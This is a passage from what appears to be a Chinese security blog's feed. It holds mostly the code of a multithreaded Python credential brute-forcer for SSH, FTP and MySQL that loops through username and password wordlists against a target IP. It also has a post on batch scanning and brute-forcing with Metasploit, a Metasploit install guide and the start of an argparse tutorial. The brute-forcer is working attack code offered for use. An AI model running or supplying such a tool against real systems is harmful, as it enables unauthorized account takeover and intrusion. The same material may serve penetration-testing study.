&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Exit the program...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Waiting...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">5&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_result(self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> finishetime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Used time: &lt;/span>&lt;span style="color:#e6db74">%f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (finishetime&lt;span style="color:#f92672">-&lt;/span>starttime)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################MySQL爆破模块#################&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MysqlBruter&lt;/span>(CommonFun):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for MysqlBruter&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, &lt;span style="color:#f92672">*&lt;/span>args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(MysqlBruter, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options,arg) &lt;span style="color:#f92672">=&lt;/span> args
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>userfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>userfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>passfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>passfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>threadnum &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>timeout &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>timeout
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_log(self&lt;span style="color:#f92672">.&lt;/span>host)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>userfile,self&lt;span style="color:#f92672">.&lt;/span>passfile,self&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_queue&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>userfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>passfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> name &lt;span style="color:#f92672">in&lt;/span> ulines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> pwd &lt;span style="color:#f92672">in&lt;/span> plines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pwd &lt;span style="color:#f92672">=&lt;/span> pwd&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">thread&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name,pwd &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>get()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn &lt;span style="color:#f92672">=&lt;/span> MySQLdb&lt;span style="color:#f92672">.&lt;/span>connect(host&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>host, user&lt;span style="color:#f92672">=&lt;/span>name, passwd&lt;span style="color:#f92672">=&lt;/span>pwd, db&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;mysql&amp;#39;&lt;/span>, port&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3306&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> conn:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># time.sleep(0.05)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[OK] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result&lt;span style="color:#f92672">.&lt;/span>append(s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>timeout:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,&lt;span style="color:#e6db74">&amp;#34;Timeout&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[Error] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,error)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> starttime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> xrange(&lt;span style="color:#ae81ff">1&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>threadnum&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>thread)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads&lt;span style="color:#f92672">.&lt;/span>append(t)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>) &lt;span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Exit the program...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Waiting...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">5&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_result(self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> finishetime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Used time: &lt;/span>&lt;span style="color:#e6db74">%f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (finishetime&lt;span style="color:#f92672">-&lt;/span>starttime)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#f92672">=&lt;/span> OptionParser(usage&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Usage: python %prog [options] type&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-i&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--host&amp;#39;&lt;/span>,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;host&amp;#39;&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;target ip&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-o&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--timeout&amp;#39;&lt;/span>,type&lt;span style="color:#f92672">=&lt;/span>int,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;timeout&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;timeout&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-t&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--thread&amp;#39;&lt;/span>,type&lt;span style="color:#f92672">=&lt;/span>int,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;threadnum&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;threadnum&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-L&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--userfile&amp;#39;&lt;/span>,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;userfile&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;username.txt&amp;#39;&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;userfile&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;-P&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;--passfile&amp;#39;&lt;/span>,dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;passfile&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;password.txt&amp;#39;&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;passfile&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options, args) &lt;span style="color:#f92672">=&lt;/span> parser&lt;span style="color:#f92672">.&lt;/span>parse_args()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> args:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> args[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ssh&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh &lt;span style="color:#f92672">=&lt;/span> SshBruter(options, args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssh&lt;span style="color:#f92672">.&lt;/span>run()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> args[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ftp&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp &lt;span style="color:#f92672">=&lt;/span> FtpBruter(options, args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>run()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> args[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;mysql&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mysql &lt;span style="color:#f92672">=&lt;/span> MysqlBruter(options, args)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mysql&lt;span style="color:#f92672">.&lt;/span>run()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;type must be ssh or ftp or mysql&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-尝试爆破">0x01 尝试爆破&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/bruter_help.png" alt="帮助信息">&lt;/p></description></item><item><title>Metasploit 利用 workspace 进行批量扫描爆破</title><link>https://wyb0.cn/posts/2016/metasploit-use-workspace-batch-blasting/</link><pubDate>Tue, 23 Aug 2016 10:05:52 +0000</pubDate><guid>https://wyb0.cn/posts/2016/metasploit-use-workspace-batch-blasting/</guid><description>&lt;h3 id="0x00-启动">0x00 启动&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/msf_start.png" alt="启动msf">&lt;/p>
&lt;h3 id="0x01-metasploit的工作平台">0x01 Metasploit的工作平台&lt;/h3>
&lt;p>在msf里的工作平台可以保存历史的一些操作信息
&lt;img src="https://wyb0.cn/img/post/msf_workspace_h.png" alt="msf工作平台的帮助信息">
&lt;img src="https://wyb0.cn/img/post/msf_workspace.png" alt="创建新的工作平台">&lt;/p>
&lt;h3 id="0x02-使用db_nmap扫描主机">0x02 使用db_nmap扫描主机&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/msf_nmap_lanou3g_ip.png" alt="扫描lanou3g的ip信息">
扫描后的结果会保留在工作平台中，可以用hosts和services进行查看：
&lt;img src="https://wyb0.cn/img/post/msf_hosts.png" alt="查看主机列表">
&lt;img src="https://wyb0.cn/img/post/msf_services.png" alt="查看服务">&lt;/p></description></item><item><title>Ubuntu 下安装 Metasploit</title><link>https://wyb0.cn/posts/2016/ubuntu-install-metasploit/</link><pubDate>Thu, 18 Aug 2016 10:38:41 +0000</pubDate><guid>https://wyb0.cn/posts/2016/ubuntu-install-metasploit/</guid><description>&lt;h3 id="0x00-安装metasploit">0x00 安装Metasploit&lt;/h3>
&lt;ul>
&lt;li>下载msfinstall脚本&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>修改文件权限&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ chmod 755 msfinstall
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>安装(可能时间较久)&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ ./msfinstall
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>更新exp&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ msfupdate
&lt;/code>&lt;/pre>&lt;h3 id="0x01-连接数据库">0x01 连接数据库&lt;/h3>
&lt;ul>
&lt;li>首先启动postgresql数据库&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ /etc/init.d/postgresql start #service postgresql start也可以
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>初始化MSF数据库(关键步骤)&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ msfdb init
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>运行msfconsole&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>$ msfconsole
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>在msf中查看数据库连接状态&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; db_status
#若出现错误：Module database cache not built yet, using slow search
#则重新构建缓存，缓存构建通常需要5-10分钟左右。
#构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块
msf &amp;gt; db_rebuild_cache
&lt;/code>&lt;/pre>&lt;h3 id="0x02-metasploit-cheat-sheet">0x02 Metasploit Cheat Sheet&lt;/h3>
&lt;p>常见命令可以看下 &lt;a href="https://www.comparitech.com/net-admin/metasploit-cheat-sheet/?_blank">https://www.comparitech.com/net-admin/metasploit-cheat-sheet/&lt;/a>&lt;/p></description></item><item><title>Python 命令行参数解析</title><link>https://wyb0.cn/posts/2016/python-parames-parse/</link><pubDate>Tue, 16 Aug 2016 15:10:44 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-parames-parse/</guid><description>&lt;h3 id="0x00-argparse-模块">0x00 argparse 模块&lt;/h3>
&lt;p>参考 &lt;a href="https://docs.python.org/zh-cn/3.7/library/argparse.html?_blank">https://docs.python.org/zh-cn/3.7/library/argparse.html&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> argparse
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Parser&lt;/span>(object):
